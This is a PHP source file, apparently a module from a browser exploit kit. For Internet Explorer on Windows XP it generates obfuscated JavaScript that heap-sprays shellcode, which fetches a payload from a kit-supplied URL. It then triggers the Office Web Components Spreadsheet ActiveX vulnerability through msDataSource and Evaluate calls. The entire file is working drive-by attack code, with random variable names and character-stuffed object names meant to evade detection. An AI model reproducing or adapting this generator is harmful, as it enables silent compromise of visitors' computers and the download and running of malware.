<?php 
if( $browser == "ie" && $os == "xp" ) 
{
    $randVar = $GLOBALS["cpFunctions"]->CreateArrayString(rand(10, 30), "100");
    $strUrl = $GLOBALS["cpXplHelper"]->GetURL("other", $browser, $os, "spreadsheet");
    $functionName = $ExploitFunctions[13];
    $replaceFunction = $GLOBALS["cpFunctions"]->RandAlpha(2);
    $eArray[] = "\r\nfunction " . $functionName . "()\r\n{\r\n\tvar " . $randVar[12] . " = \"" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $replaceFunction) . "\".replace(/" . $replaceFunction . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n\tvar " . $randVar[2] . " = unescape(" . $randVar[12] . ");\r\n\tvar " . $randVar[11] . " = \"" . $randVar[13] . "0b0c" . $randVar[13] . "0b0c\".replace(/" . $randVar[13] . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n\tvar " . $randVar[3] . " = unescape(" . $randVar[11] . ");\r\n\twhile (" . $randVar[3] . ".length < 0x100000)\r\n\t\t" . $randVar[3] . " += " . $randVar[3] . ";\r\n\t\t" . $randVar[4] . " = 0x100000 - (" . $randVar[2] . ".length + 20);        \r\n\t\t" . $randVar[3] . " = " . $randVar[3] . ".substring(0, " . $randVar[4] . ");\r\n\t\t" . $randVar[5] . " = new Array();\r\n\tfor (var i = 0 ; i < 100 ; i++){\r\n\t\t" . $randVar[5] . "[i] = " . $randVar[3] . " + " . $randVar[2] . ";\r\n\t}\r\n\t\t" . $randVar[7] . "();\r\n\t}    \r\n\tfunction " . $randVar[7] . "()\r\n\t{\r\n          var " . $randVar[8] . ", " . $randVar[9] . ";\r\n\ttry {\r\n\t\t\t" . $randVar[8] . " = new ActiveXObject(\"" . $randVar[2] . "O" . $randVar[2] . "W" . $randVar[2] . "C" . $randVar[2] . "1" . $randVar[2] . "0." . $randVar[2] . "S" . $randVar[2] . "p" . $randVar[2] . "r" . $randVar[2] . "e" . $randVar[2] . "a" . $randVar[2] . "d" . $randVar[2] . "s" . $randVar[2] . "h" . $randVar[2] . "e" . $randVar[2] . "e" . $randVar[2] . "t\".replace(/" . $randVar[2] . "/g,''));\r\n\t} catch (err) { \r\n              try {\r\n                  " . $randVar[8] . " = new ActiveXObject(\"" . $randVar[2] . "O" . $randVar[2] . "W" . $randVar[2] . "C" . $randVar[2] . "1" . $randVar[2] . "1" . $randVar[2] . "." . $randVar[2] . "S" . $randVar[2] . "pr" . $randVar[2] . "e" . $randVar[2] . "a" . $randVar[2] . "d" . $randVar[2] . "s" . $randVar[2] . "h" . $randVar[2] . "e" . $randVar[2] . "e" . $randVar[2] . "t\".replace(/" . $randVar[2] . "/g,''));\t\r\n         \t\t} catch (err) {    \t\r\n\t\t}\r\n\t}\r\n       " . $randVar[9] . " = new Array();\r\n       " . $randVar[9] . ".push(1);\r\n       " . $randVar[9] . ".push(2);\r\n       " . $randVar[9] . ".push(0);\r\n       " . $randVar[9] . ".push(window);\r\n\tfor (var i = 0 ; i < " . $randVar[9] . ".length ; i++) {\r\n              for (var j = 0 ; j < 10 ; j++) {\r\n                  try {\r\n                      " . $randVar[8] . ".Evaluate(" . $randVar[9] . "[i]);\r\n                  } catch (err) {\r\n\t\t\t\t\t{next}\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}        \r\n\t\twindow.status = " . $randVar[9] . "[3] + \"\";\r\n\t\tfor (var j = 0 ; j < 10 ; j++) {\r\n\t\ttry {\r\n\t\t\t" . $randVar[8] . ".msDataSource(" . $randVar[9] . "[3]);\r\n\t\t} catch (err) {\r\n\t\t{next}\r\n\t\treturn;\r\n\t\t}\r\n\t}\r\n\t{next}\r\n}";
}


